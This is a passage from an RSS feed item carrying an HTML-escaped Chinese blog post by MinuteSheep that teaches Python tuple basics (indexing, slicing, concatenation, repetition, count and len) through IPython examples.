In [&lt;/span&gt;188]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 666, [1, 3,5], (2,4,6), {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:250&lt;span&gt;},)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 与列表极为相似&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;2.元组索引&lt;/h4&gt;
&lt;p&gt;同列表一样&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
In [189]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;&lt;span&gt;)   

In [&lt;/span&gt;190]: systems[1&lt;span&gt;]
Out[&lt;/span&gt;190]: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;3.元组切片&lt;/h4&gt;
&lt;p&gt;同列表一样&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
In [191]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;&lt;span&gt;)

In [&lt;/span&gt;192]: systems[2&lt;span&gt;:]
Out[&lt;/span&gt;192]: (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,)
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;4.元组组合&lt;/h4&gt;
&lt;p&gt;同列表一样&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
In [194&lt;span&gt;]: systems
Out[&lt;/span&gt;194]: (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;&lt;span&gt;)

In [&lt;/span&gt;197]: systems1 = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,)

In [&lt;/span&gt;198]: systems +&lt;span&gt; systems1
Out[&lt;/span&gt;198]: (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;IOS&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;&lt;span&gt;)


In [&lt;/span&gt;200]: systems * 3&lt;span&gt;
Out[&lt;/span&gt;200&lt;span&gt;]:
(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;',&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;5.元组统计&lt;/h4&gt;
&lt;p&gt;同列表一样&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
In [202]: systems = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Windows&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Unix&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,)

In [&lt;/span&gt;203]: systems.count(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Linux&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
Out[&lt;/span&gt;203]: 1
&lt;/pre&gt;
&lt;p&gt;  In [204]: len(systems)&lt;br/&gt;  Out[204]: 3&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;元组就这么多o_o ....&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 05:15:00 +0000</pubDate>
<dc:creator>MinuteSheep</dc:creator>
<og:description>本篇博文主要讲解Python的列表和元组，重点分析了列表的不同复制拷贝方法</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/minutesheep/p/10325694.html</dc:identifier>
</item>
</channel>
</rss>